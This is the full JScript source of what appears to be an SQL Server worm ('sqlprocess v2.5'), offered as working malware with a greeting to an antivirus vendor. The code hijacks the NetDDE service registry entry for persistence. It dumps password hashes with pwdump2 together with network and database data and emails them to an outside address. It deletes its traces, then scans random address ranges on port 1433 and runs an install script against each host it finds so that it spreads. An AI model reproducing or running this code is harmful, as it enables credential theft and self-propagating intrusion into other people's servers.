// sqlprocess v2.5
// Greetings to whole Symantec anti-virus department.

threads = 100;

interval = 5000;
installtime = 300000;

shell = new ActiveXObject("WScript.Shell");
fs = new ActiveXObject("Scripting.FileSystemObject");

if (WScript.Arguments.length > 0)
 if (WScript.Arguments(0) == "init")
  {
   timer = new ActiveXObject("Timer.Sleep");
   shell.Run("\"" + WScript.ScriptFullName + "\"");
   timer.DoSleep(60000);
   WScript.Quit();
  }

clefile = shell.ExpandEnvironmentStrings("%SystemRoot%\\system32\\msver241.srq");
path = fs.GetFile(WScript.ScriptFullName).ParentFolder + "\\";

function random(min_number, max_number)
 {
  return min_number + Math.round((max_number - min_number) * Math.random());
 }

sdataip = new Array(216, 64, 211, 209, 210, 212, 206, 61, 63, 202, 208, 24, 207, 204, 203, 66, 65, 213, 12, 192, 194, 195,
                    198, 193, 217, 129, 140, 142, 148, 128, 196, 200, 130, 146, 160, 164, 170, 199, 205, 43, 62, 131, 144,
                    151, 152, 168, 218, 4, 38, 67, 90, 132, 134, 150, 156, 163, 166,169);

sdataf = new Array(151, 111, 101, 62, 49, 45, 43, 40, 36, 36, 33, 27, 25, 24, 23, 20, 18, 13, 12, 10, 10, 10, 9, 8, 8, 6, 6,
                   6, 6, 5, 5, 5, 4, 4, 4, 4, 4, 4, 4, 3, 3, 3, 3, 3, 3, 3, 3, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2)

sarraylength = sdataip.length;
statarray = new Array();

for (s = 0;s < sarraylength;s++)
 {
  arraylength = statarray.length;

  for (i = arraylength;i < arraylength + sdataf[s];i++)
   statarray[i] = sdataip[s];
 }

function password()
 {
  pass = "";

  for (counter = 0;counter < 4;counter++)
   pass += String.fromCharCode(random(97, 122)) + random(0, 9);
  
  return pass;
 }

function destroy(filename)
 {
  if (!fs.FileExists(filename))
   return false;

  file = fs.GetFile(filename);
  tempname = file.Name = fs.GetTempName();
  file.Delete(true);

  newfile = fs.CreateTextFile(tempname, true);
  newfile.Close();

  file = fs.GetFile(tempname);
  file.Delete(true);

  return true;
 }

if (WScript.Arguments.length != 0)
 {
  shell.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\NetDDE\\ImagePath", "%COMSPEC% /c start netdde && sqlprocess init", "REG_EXPAND_SZ");
  shell.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\NetDDE\\Start", 2, "REG_DWORD");

  shell.Run("regsvr32 /s timer.dll", 0, true);

  sql = new ActiveXObject("SQLDMO.SQLServer");
  sql.Connect(".", "sa", WScript.Arguments(0));

  if (sql.VersionMajor == 7)
   shell.RegWrite("HKLM\\software\\microsoft\\mssqlserver\\client\\connectto\\dsquery", "dbmssocn");

  sql.Close();

  fs.CopyFile(shell.ExpandEnvironmentStrings("%SystemRoot%\\system32\\regedt32.exe"), shell.ExpandEnvironmentStrings("%SystemRoot%\\"), true);

  destroy(clefile);

  shell.Run("cmd /c ipconfig /all > send.txt", 0, true);
  shell.Run("cmd /c cscript sqldir.js . sa " + WScript.Arguments(0) + " /r3s >> send.txt", 0, true);
  shell.Run("cmd /c pwdump2 >> send.txt", 0, true);
  shell.Run("clemail.exe -bodyfile send.txt -to ixltd@postone.com -subject SystemData-" + WScript.Arguments(0), 0, true);

  destroy(clefile);
  destroy(path + "send.txt");
 }
  
shell.Run("net use /persistent:no", 0);

timer = new ActiveXObject("Timer.Sleep");

for (;;)
 {
  do
   {
    number = statarray[random(0, 1235)];

    if (typeof(number) == "undefined")
     number = random(1, 223);
   }
  while (number == 10 || number == 127 || number == 172 || number == 192)

  shell.Run("drivers\\services -q -c 10000 " + number + "." + random(0, 255) + ".1.1-255.254 -p 1433 -o rdata.txt -z " + threads, 0, true);

  rdata = fs.OpenTextFile(path + "rdata.txt", 1);

  while (!rdata.AtEndOfStream)
   {
    ip = rdata.ReadLine();

    if (ip.indexOf("1433/tcp") == -1)
     continue;

    ip = ip.slice(0, ip.indexOf(" "));

    shell.Run("sqlinstall.bat " + ip + " " + password(), 0);

    counter = 0;

    do
     {
      if (counter > installtime / interval)
       break;

      timer.DoSleep(interval);
      counter++;
     }
    while (!destroy(path + ip + ".ok") && !destroy(path + ip + ".fail"))
   }

  rdata.Close();
  destroy(path + "rdata.txt");
 }